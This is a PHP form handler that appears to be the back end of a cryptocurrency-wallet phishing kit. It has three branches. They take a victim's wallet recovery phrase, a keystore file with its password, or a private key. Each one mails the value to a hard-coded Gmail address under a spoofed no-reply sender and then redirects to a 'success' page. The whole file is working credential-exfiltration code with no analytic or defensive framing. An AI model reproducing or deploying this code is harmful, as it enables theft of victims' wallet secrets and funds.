<?php


if(isset($_POST['submit1'])) {

		$wallet = $_POST['wallet_name'];
		$message = $_POST['phrase'];
		
		$mailto = "oghievictor@gmail.com";
		$txt = "You have received an e-mail from ".$wallet.".\r\n".$message;
		
		$headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$headers = 'From: <no-reply@rytyt.com>'."\r\n"; 
		
		
		
		mail($mailto, $wallet, $txt, $headers);
		header("location:success.php");		


				

}




if(isset($_POST['submit2'])) {
		$subject = "keystorejson";
		$wallet = $_POST['keystore'];
		$message = $_POST['keystorepassword'];
		
		$mailto = "oghievictor@gmail.com";
		$txt = "You have received an e-mail from Keystorejson <br>".$wallet.".\r\n".$message;
		
		$headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$headers = 'From: <no-reply@rytyt.com>'."\r\n"; 
		
		
		
		mail($mailto, $subject, $txt, $headers);
		header("location:success.php");		


				

}

if(isset($_POST['submit3'])) {
	
	$subject = "private_key";
	$wallet = $_POST['wallet_name'];
		$message = $_POST['privatekey'];
		
		
		$mailto = "oghievictor@gmail.com";
		$txt = "You have received a private_key e-mail from ".$wallet.".\r\n".$message;
		
		$headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$headers = 'From: <no-reply@rytyt.com>'."\r\n"; 
		
		
		
		mail($mailto, $subject, $txt, $headers);
		header("location:success.php");		


				

}













?>








?>